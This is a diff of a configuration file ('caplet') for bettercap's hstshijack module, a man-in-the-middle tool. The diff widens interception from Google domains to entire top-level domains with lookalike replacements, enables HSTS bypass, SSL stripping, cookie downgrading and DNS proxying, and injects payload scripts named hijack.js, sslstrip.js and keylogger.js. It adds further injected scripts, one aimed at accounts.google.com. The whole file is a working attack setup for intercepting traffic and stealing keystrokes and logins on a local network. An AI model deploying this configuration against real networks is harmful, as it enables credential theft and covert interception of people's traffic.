@@ -1,24 +1,35 @@
 # Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 
+set $ ""
+
+#events.ignore http.proxy.spoofed
+
 # Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
 # variables get precendence over those assigned to the 'hstshijack.ignore' variable.
-set hstshijack.targets         google.com, *.google.com, gstatic.com, *.gstatic.com
-set hstshijack.replacements    google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
-set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
-set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
-set hstshijack.ssl.check       true
-#set hstshijack.blockscripts    example.com,*.example.com
-set hstshijack.obfuscate       true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google-search.js
-set hstshijack.whitelist       /usr/local/share/bettercap/caplets/hstshijack/whitelist.json
-set hstshijack.ignore          captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
+set hstshijack.targets                    *.com, *.net,*.me, *.nl,clarity.ms,*.clarity.ms,*.ai,*.co.uk,*.cn,*.google
+set hstshijack.replacements               *.corn,*.nel,*.rne,*.ni,clarity.ns,*.clarity.ns,*.al,*.cc.uk,*.ch,*.googl
+set hstshijack.replacements.req.body      /home/buffermet/git/github.com/bettercap/caplets/hstshijack/replacements/req.Body.json
+set hstshijack.replacements.req.headers   /home/buffermet/git/github.com/bettercap/caplets/hstshijack/replacements/req.Headers.json
+set hstshijack.replacements.req.url       /home/buffermet/git/github.com/bettercap/caplets/hstshijack/replacements/req.URL.json
+set hstshijack.replacements.res.body      /home/buffermet/git/github.com/bettercap/caplets/hstshijack/replacements/res.Body.json
+set hstshijack.replacements.res.headers   /home/buffermet/git/github.com/bettercap/caplets/hstshijack/replacements/res.Headers.json
+set hstshijack.ssl.domains                /home/buffermet/git/github.com/bettercap/caplets/hstshijack/ssl/domains.txt
+set hstshijack.ssl.index                  /home/buffermet/git/github.com/bettercap/caplets/hstshijack/ssl/index.json
+set hstshijack.ssl.index.check            true
+set hstshijack.ssl.discovery.synchronous  true
+set hstshijack.ssl.discovery.timeout      4
+set hstshijack.cookies.downgrade          true
+#set hstshijack.blockscripts               example.com,*.example.com
+set hstshijack.obfuscate                  true
+set hstshijack.payloads                   *:/home/buffermet/git/github.com/bettercap/caplets/hstshijack/payloads/hijack.js,*:/home/buffermet/git/github.com/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/home/buffermet/git/github.com/bettercap/caplets/hstshijack/payloads/keylogger.js,*.google.com:/home/buffermet/git/github.com/bettercap/caplets/hstshijack/payloads/google-search.js,google.com:/home/buffermet/git/github.com/bettercap/caplets/hstshijack/payloads/google-search.js,*:/home/buffermet/amoeba/extension/scripts/hstshijack.amoeba.js,*:/home/buffermet/amoeba/extension/scripts/hstshijack.hid.js,*:/home/buffermet/amoeba/extension/scripts/hstshijack.open.url.js,accounts.google.com:/home/buffermet/amoeba/extension/scripts/hstshijack.accounts.google.com.js
+set hstshijack.whitelist                  /home/buffermet/git/github.com/bettercap/caplets/hstshijack/session/whitelist.json
+set hstshijack.ignore                     captive.apple.com,connectivitycheck.gstatic.com,detectportal.firefox.com,www.msftconnecttest.com
 
 net.recon on
 
-set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
+set http.proxy.script  /home/buffermet/git/github.com/bettercap/caplets/hstshijack/modules/http.proxy.js
 http.proxy on
 
-set dns.spoof.domains  google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
-set dns.spoof.all      true
-dns.spoof on
+set dns.proxy.script /home/buffermet/git/github.com/bettercap/caplets/hstshijack/modules/dns.proxy.js
+dns.proxy on
 
